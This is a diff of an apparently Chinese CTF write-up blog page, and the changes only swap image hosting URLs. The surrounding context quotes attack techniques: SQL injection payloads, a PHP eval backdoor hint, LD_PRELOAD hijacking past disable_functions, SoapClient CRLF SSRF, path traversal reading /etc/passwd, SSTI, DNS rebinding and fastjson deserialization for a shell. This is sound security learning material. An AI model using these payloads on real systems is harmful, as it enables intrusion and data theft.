+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005778.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="web-3-美男子">Web 3 美男子
@@ -21252,7 +21252,7 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">key1=&amp;#39; or 1=1 GROUP BY key2 WITH ROLLUP LIMIT 1 OFFSET 1;#&amp;amp;key2=
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005931.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005931.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="web-4-easy-login">Web 4 Easy Login
@@ -21286,7 +21286,7 @@ Easy Login&amp;hellip;So Easy&amp;hellip;
 &lt;h2 id="hacking">Hacking
 &lt;/h2>&lt;p>由于环境关掉了，这里就不放图了。说一下几个解法。&lt;/p>
 &lt;p>首先通过弱口令 karaf/karaf 进行认证，进入发现是 jetty 的中间件，然后思路一直走偏在这个中间件上，直到有师傅跟我说 ghost pepper 指的是 Jolokia…nb&amp;hellip;&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009331.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009331.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>然后又参考了几篇腾讯云鼎的相关文章：&lt;/p>
@@ -21371,13 +21371,13 @@ Let&amp;rsquo;s try to execute &lt;code>/readflag&lt;/code> to get the flag.
 Open basedir: /var/www/html:/tmp/7833d7f27adcba46bdfd6c9c31c89904
 Hint: eval($_POST[&amp;ldquo;backdoor&amp;rdquo;]);&lt;/p>
 &lt;/blockquote>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008570.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008570.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="the-first-way-to-hack">The first way to Hack
 &lt;/h2>&lt;p>一看题目意图也比较明显，需要我们利用&lt;code>Imagick&lt;/code>这个模块去进行 rce&lt;/p>
 &lt;p>我们先直接看看&lt;code>phpinfo()&lt;/code>，发现果然是能执行命令的基本都被 disable 掉了&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002789.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002789.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们还可以调用&lt;code>readfile()&lt;/code>来查看题目源代码&lt;/p>
@@ -21425,7 +21425,7 @@ loading="lazy"
 &lt;p>open_basedir 将 php 所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如&lt;code>fopen()&lt;/code>或&lt;code>file_get_contents()&lt;/code>打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开。&lt;/p>
 &lt;p>{% endcolorquote %}&lt;/p>
 &lt;p>例如就像这样，设置了&lt;code>ini_set('open_basedir','/var/www/html');&lt;/code>之后，我们只能在&lt;code>/var/www/html&lt;/code>进行操作，即&lt;code>open_basedir&lt;/code>是用来限制访问目录的&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006126.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006126.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="bypass-open_basedir">Bypass Open_Basedir
@@ -21447,7 +21447,7 @@ loading="lazy"
 >LD_PRELOAD的偷梁换柱之能&lt;/a>&lt;/p>
 &lt;h3 id="劫持攻击">劫持攻击
 &lt;/h3>&lt;p>参考的绕过文章使用了&lt;code>mail()&lt;/code>函数，我们可以看看&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004191.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004191.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里确实开启了子进程，那我们再试试引入&lt;code>putenv()&lt;/code>的效果，配合动态链接库尝试劫持，代码来自&lt;a class="link" href="https://github.com/TarlogicSecurity/Chankro" target="_blank" rel="noopener"
@@ -21548,11 +21548,11 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004080.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004080.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以看到已经执行了&lt;code>ls&lt;/code>命令并成功输出了&lt;code>hacked&lt;/code>，使用&lt;code>strace&lt;/code>看看我们可以发现执行顺序。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008064.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008064.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>当然还有另一种劫持，直接选择一个函数进行劫持，例如我们通过&lt;code>strace php test.php&lt;/code>发现调用了&lt;code>geteuid()&lt;/code>以及&lt;code>getpid()&lt;/code>函数，我们可以在&lt;code>hack.c&lt;/code>中这么写&lt;/p>
@@ -21597,12 +21597,12 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这样也可以完成劫持&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002758.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002758.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="getflag">GetFlag
 &lt;/h3>&lt;p>所以我们需要找到一个可以启动子进程的函数，以实现我们劫持函数做到 RCE 的目的，然后这里我本地调通了但是远程不知道怎么没打通&amp;hellip;&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009740.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009740.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里我直接用&lt;code>new&lt;/code>了一个&lt;code>.jpg&lt;/code>也可以调用子进程，但是服务器却没有触发&amp;hellip;&lt;/p>
@@ -21679,7 +21679,7 @@ loading="lazy"
 &lt;/div>&lt;h3 id="the-other-way">The other way
 &lt;/h3>&lt;p>也可以利用&lt;a class="link" href="https://www.php.net/manual/zh/function.error-log.php" target="_blank" rel="noopener"
 >error_log&lt;/a>这个方法，这个方法也开启了子进程调用了&lt;code>sendmail&lt;/code>方法。按照之前的思路进行就可以了&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007064.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007064.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="参考">参考
@@ -21700,12 +21700,12 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这里参考了其他师傅的 wp ，主要是利用了&lt;code>@BPGDecodeDelegate&lt;/code>对于后缀&lt;code>.bpg&lt;/code>的解析，它会去 PATH 中寻找相关的&lt;code>bpgenc&lt;/code>文件&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009100.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009100.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>所以我们只需要设置一个恶意的 PATH ，并在这个文件夹下放入我们的可执行文件。&lt;/p>
 &lt;p>只要找到函数要执行的文件我们就可以进行操作了。例如下面用了&lt;code>Imagick-&amp;gt;readImage()&lt;/code>的方法&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002391.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002391.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h1 id="conclusion">Conclusion
@@ -21776,7 +21776,7 @@ loading="lazy"
 &lt;p>可以参考&lt;a class="link" href="https://www.freebuf.com/articles/web/149761.html" target="_blank" rel="noopener"
 >Nginx不安全配置可能导致的安全漏洞&lt;/a>与&lt;a class="link" href="https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html" target="_blank" rel="noopener"
 >三个案例看Nginx配置安全&lt;/a>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008852.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008852.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>下载得到源码&lt;/p>
@@ -21862,7 +21862,7 @@ loading="lazy"
 >SoapClient&lt;/a> objects in &lt;em>WSDL&lt;/em> or &lt;em>non-WSDL&lt;/em> mode.&lt;/p>
 &lt;/blockquote>
 &lt;p>这是一个 php 的内部类，简单来说就是用来创建 soap 数据报文，与 wsdl 接口进行交互的。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001161.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610001161.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>其中&lt;code>__call&lt;/code>的魔术方法就比较有意思了&lt;/p>
@@ -21907,7 +21907,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>当我们直接运行这段代码的时候，就因为调用了一个&lt;code>SoapClient&lt;/code>不存在的方法&lt;code>hack()&lt;/code>导致直接调用了&lt;code>__call()&lt;/code>魔术方法&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005272.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005272.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>详细可以参考&lt;a class="link" href="https://xz.aliyun.com/t/2148" target="_blank" rel="noopener"
@@ -22199,11 +22199,11 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>利用反序列化的特点，我们可以直接定义私有变量的值，但是字符串中会有不可见字符，实验如下&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005682.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005682.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>所以我们需要用&lt;code>base64_encode&lt;/code>进行编码，把编码得到的字符串再在 burp 里面进行解码构造请求。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008851.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008851.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="soapclient-ssrf">SoapClient SSRF
@@ -22256,7 +22256,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>当我们请求 8080 的时候，请求的是 miniProxy，但是只能用 GET 请求，而我们之前可以发现&lt;code>SoapClient&lt;/code>只能发 POST 请求&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005778.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005778.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里大概思路也比较清晰了，就是利用 miniProxy 使用 gopher 协议去访问 mssql 数据库拿到 flag ，但是怎么处理让&lt;code>SoapClient&lt;/code>发送 GET 请求呢？&lt;/p>
@@ -22269,12 +22269,12 @@ loading="lazy"
 &lt;p>The &lt;em>user_agent&lt;/em> option specifies string to use in &lt;em>User-Agent&lt;/em> header.&lt;/p>
 &lt;/blockquote>
 &lt;p>而且在 header 里 &lt;code>User-Agent&lt;/code> 在 &lt;code>Content-Type&lt;/code> 前面，这里我们可以使用 CRLF 进行分隔请求，构造 GET 请求。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005475.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005475.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="miniproxy-url-scheme-bypass">miniProxy URL scheme bypass
 &lt;/h4>&lt;p>我们自己本地看看 MiniProxy 怎么用。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003617.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003617.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>随便测一个&lt;code>file:///etc/passwd&lt;/code>，返回&lt;/p>
@@ -22469,10 +22469,10 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">insert into posts (userid, title, content, attachment) values ({}, &amp;#34;foobar&amp;#34;, (select flag from flag.flag), &amp;#34;foobar&amp;#34;);
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007735.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007735.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000709.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000709.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="conclusion">Conclusion
@@ -22723,7 +22723,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这里强烈建议使用 FireFox + Cookie Manager 来完成，因为感觉这个 session 控制写的不是很好，不带 cookie 访问的话，它会强制重置你的 cookie ，然后就会变成每次都需要 burp 抓包来修改 cookie ，十分麻烦&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009559.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009559.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="sql-injection">SQL Injection
@@ -22746,7 +22746,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>继续 fuzz ，在&lt;code>1 union select 1,2,3,4%23&lt;/code>的时候回显正常，猜测有4列&lt;/p>
 &lt;p>通过&lt;code>id=1 union select 1,2,@@version,4 limit 1,1%23&lt;/code>，得到了在文本编辑框中的版本号，也通过&lt;code>user()&lt;/code>发现是&lt;code>root@localhost&lt;/code>的权限，想要拿到 shell ，自然先想怎么去写入 webshell&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004962.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004962.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="getshell">GetShell
@@ -22760,7 +22760,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>发现为空，那就说明可以为所欲为了&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000440.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000440.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>通过&lt;/p>
@@ -23415,7 +23415,7 @@ Answer 30 questions correctly in a row during 40 seconds(The calculation result 
 &lt;p>这题很坑很坑&amp;hellip;做得有点生气&lt;/p>
 &lt;p>首先 1-10 关需要带一些普通请求头访问，否则第十关会直接返回&lt;code>shutdown&lt;/code>命令，我没有用管理员直接跑，所以没关机，但是我误以为这是要求&lt;code>python&lt;/code>返回值的问题，然后搞了半天发现是需要带一些请求头&lt;/p>
 &lt;p>然后在 11 关他会修改一个字体的 style ，比如我得到文本为&lt;code>(972279097)/414696815/(472238406)+769794962*(27940524)=?&lt;/code>，但是视觉效果却是&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009851.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009851.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>字体 style 为&lt;/p>
@@ -23608,7 +23608,7 @@ hint: 了解一下 tomcat、spring mvc 的目录结构和配置文件(自己搭�
 hint2: 图片目录不在 web 目录下&lt;/p>
 &lt;/blockquote>
 &lt;p>输入答案 2 之后，进入下一题，发现是个计算&amp;hellip;&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005634.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005634.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>我直接放在一旁跑 1-999，然后继续看题，查看源码我们可以发现&lt;/p>
@@ -23645,12 +23645,12 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>图片文件有些怪异，竟然是个&lt;code>.php&lt;/code>后缀，尝试看看文件，发现报错&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009022.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009022.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>看来是个&lt;code>base64&lt;/code>加密的图片名字格式，&lt;code>atob(&amp;quot;cXVlc3Rpb24ucG5n&amp;quot;)&lt;/code>得到&lt;code>question.png&lt;/code>&lt;/p>
 &lt;p>尝试用&lt;code>/img/answer.png.php&lt;/code>访问，换了一种报错&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007909.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007909.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>猜测是个可以任意文件读取，然后我们用&lt;code>../../../../../etc/passwd&lt;/code>经过 base64 编码后加上&lt;code>.php&lt;/code>访问，成功得到文件内容，于是猜解目录结构，发现经过&lt;code>../../&lt;/code>之后就是根目录。&lt;/p>
@@ -23750,7 +23750,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>但是文件内容对我们接下来要读取的源码并没什么帮助，于是找了很多其他的配置文件都没有找到，最后想起来报错页面应该会有项目文件的名字，也就是之前的那张图：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007909.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007909.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们可以看到包名&lt;code>hgame.controller&lt;/code>，然后&lt;code>MathController&lt;/code>就是控制器，对应的就是&lt;code>.class&lt;/code>文件，&lt;code>image()&lt;/code>对应的就是&lt;code>MathController&lt;/code>这个类中的方法。这样从包名我们就可以找到文件路径了，猜测就是&lt;code>hgame/controller/MathController.class&lt;/code>，因为是编译好的，所以是&lt;code>.class&lt;/code>结尾，而不是&lt;code>.java&lt;/code>&lt;/p>
@@ -25036,11 +25036,11 @@ hint:md5 碰撞 你自己本地去生成 3 个 md5 值一样的 sha 值不一样
 /{{[].&lt;strong>class&lt;/strong>.&lt;strong>base&lt;/strong>.&lt;strong>subclasses&lt;/strong>()}} 与 /{{[].&lt;strong>class&lt;/strong>.&lt;strong>base&lt;/strong>.&lt;strong>subclasses&lt;/strong>}}
 {% endraw %}
 两个返回均相同&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005995.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005995.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>发现是&lt;code>()&lt;/code>被过滤了&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001230.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610001230.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>一直想着去用文件读取&lt;code>secret_key&lt;/code>，但是又因为&lt;code>()&lt;/code>被过滤，怎么也做不出来&lt;/p>
@@ -25083,7 +25083,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">{u&amp;#39;csrf_token&amp;#39;: u&amp;#39;1acb6e2d00a7f28bbdfc4d531529b336ca4240b5&amp;#39;, u&amp;#39;_fresh&amp;#39;: True, u&amp;#39;user_id&amp;#39;: u&amp;#39;1&amp;#39;, u&amp;#39;_id&amp;#39;: u&amp;#39;f228e33c1bf2526005f7c10129d9a129fc6a22f681a6c21d74a298de12af20997fb2a62de669b484eb81c065c30f2f7599bfd357dcf5c286cab416b0f6ed0f6a&amp;#39;}
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008065.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008065.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="happyphp">happyPHP
@@ -25162,7 +25162,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>所以我们还是需要登录管理员账号去获取 flag，而且这里的注入点是&lt;code>name&lt;/code>，邮箱唯一，所以我们可以注册一个&lt;code>name=admin' or 1=1;#&lt;/code>的账户测试注入&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009312.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009312.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>所以用&lt;/p>
@@ -25270,7 +25270,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>把相关参数填上，得到密码 9pqfPIer0Ir9UUfR，登录&lt;code>admin@hgame.com&lt;/code>得到 flag&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004720.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004720.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里一开始以为自己破解密码的思路不太对，而且自己之前也没有关注到 commit 找到&lt;code>$key&lt;/code>。还是主要是找脚本不太好找，我尝试了很多个脚本都没有成功解密。后来经过师傅提点才知道确实可以密码破解，就去各种找密码了才搞定。&lt;/p>
@@ -25280,11 +25280,11 @@ loading="lazy"
 hint: spring-boot-actuator&lt;/p>
 &lt;p>http://119.28.26.122:23333/index&lt;/p>
 &lt;/blockquote>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002409.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002409.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>题目设置很简单，目录什么的不存在的，直接访问&lt;code>/hgame_flag&lt;/code>直接返回与其他页面一样的 404 不存在的错误&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002505.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002505.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>看了一下&lt;a class="link" href="https://www.freebuf.com/news/193509.html" target="_blank" rel="noopener"
@@ -25486,16 +25486,16 @@ loading="lazy"
 &lt;p>首先了解一波&lt;a class="link" href="http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener"
 >关于 DNS-rebinding 的总结&lt;/a>，可以发现有个比较方便的方法，就是设置两个 A 记录，一个指向 127.0.0.1，另外一个指向不是 127.0.0.1 的地址即可。&lt;/p>
 &lt;p>这里原文解释的不是很清楚，又请教了一下白师傅，才明白两个记录怎么绕过对 127.0.0.1 的检测的。首先第一次 DNS 解析在 waf 处，检查 DNS 记录是否是 127.0.0.1 ，第二次 DNS 解析在 ajax 或者请求我们传入的 url 地址的时候进行的，因为 DNS 随机解析，所以如果第一次解析，解析到了我们设置的非 127.0.0.1 的地址，就可以绕过 waf 对 127.0.0.1 的检测，否则解析到 127.0.0.1 就直接被 waf ，所以第一次通过的概率为 1/2 ；如果第二次解析，也就是在对 url 进行请求的时候，解析到了 127.0.0.1 的话，这次 ssrf 就算成功了，也就达到了我们访问内网地址的目的，如果解析不是 127.0.0.1 的话，那就失败了，所以第二次成功概率也是 1/2 。综述，整个&lt;code>DNS Rebinding&lt;/code>采用两个&lt;code>A&lt;/code>记录绕过的成功概率为 1/2 。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009642.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009642.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以看到这里已经成功了。&lt;/p>
 &lt;p>传入&lt;code>data&lt;/code>参数，因为作为&lt;code>/secret_flag&lt;/code>的参数，这里注意要用&lt;code>urlencode&lt;/code>，看到返回&lt;code>WoW! Convert JSON to object...OK!&amp;lt;br&amp;gt;Result: 1&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009810.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009810.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以使用&lt;code>fastjson&lt;/code>反序列化搞定，但是使用&lt;code>vulhub&lt;/code>下的&lt;code>fastjson&lt;/code>的 exp 直接就报了 waf&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004231.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004231.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>参考&lt;a class="link" href="https://www.restran.net/2018/10/29/fastjson-rce-notes/#%E5%9F%BA%E4%BA%8E-JNDI-%E7%9A%84-PoC" target="_blank" rel="noopener"
@@ -25552,10 +25552,10 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>记得二次 urlencode ，成功&lt;code>getshell&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002294.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002294.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003389.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003389.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="happygo">happyGo
@@ -25567,11 +25567,11 @@ loading="lazy"
 &lt;/blockquote>
 &lt;p>复现题 2333……orz&lt;/p>
 &lt;p>题目提供注册登录功能，登录进来后可以发送消息&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008211.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008211.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>也可以修改自己的头像&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005282.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005282.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>发现源码有地方&lt;/p>
@@ -26108,7 +26108,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>读取 flag&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004373.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004373.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="happyxss">HappyXSS
@@ -26224,7 +26224,7 @@ loading="lazy"
